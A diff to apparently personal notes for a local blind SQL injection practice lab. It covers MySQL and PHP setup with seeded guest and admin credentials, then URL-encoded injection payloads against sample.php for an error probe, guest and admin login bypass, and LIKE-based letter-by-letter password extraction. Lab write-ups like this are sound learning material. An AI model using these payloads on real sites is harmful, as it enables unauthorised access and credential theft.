@@ -21,13 +21,60 @@ Success or Failure
 
 Can you ask the right questions????
 -----------------------------------------------------------------------------------
+starting mysql,
+sudo systemctl start mysql
+sudo systemctl status mysql
 
-Changed the line in php file, $db = new mysqli('127.0.0.1', 'teni', 'teni', 'sqli_challenge');
- to this line , $db = new mysqli('127.0.0.1', 'teni', 'Teni@1234', 'sqli_challenge');
+log in to mysql ,  sudo mysql
+
+makinf challenge database, 
+CREATE DATABASE sqli_challenge;
+USE sqli_challenge;
+
+making user table , 
+CREATE TABLE users (
+    id VARCHAR(20),
+    pw VARCHAR(50)
+);
+
+the user database is empty , so entering database...
+INSERT INTO users VALUES ('guest', 'guest');
+INSERT INTO users VALUES ('admin', 'SUPERSECRET');
+
+set password policy , 
+SET GLOBAL validate_password.policy=LOW;
+SET GLOBAL validate_password.length=4;
+
+create user , 
+CREATE USER 'teni'@'localhost' IDENTIFIED BY 'teni';
+GRANT ALL PRIVILEGES ON sqli_challenge.* TO 'teni'@'localhost';
+FLUSH PRIVILEGES;
+
+exit , 
+EXIT;
+
+make folder, 
+mkdir ~/blind_sqli
+cd ~/blind_sqli
+
+copy sample.php to this file,
+cp ~/Desktop/challenge_5/sample.php ~/blind_sqli/
+
+start php server,
+php -S 127.0.0.1:8000
+
+challege page link ,  http://127.0.0.1:8000/sample.php
+
+checking if injection is possible , 
+http://127.0.0.1:8000/sample.php?pw='       , must show error
+admin login , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23
+
 
 use the link , http://127.0.0.1:8000/sample.php?pw=%27||1=1%23 , to login as guest
 
 use link , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23 , to login as admin
+
+Finding password letter by letter
 
 Checking first letter of password is "A" , if shows hello guest , admin pass not start with a
 http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27a%25%27%23
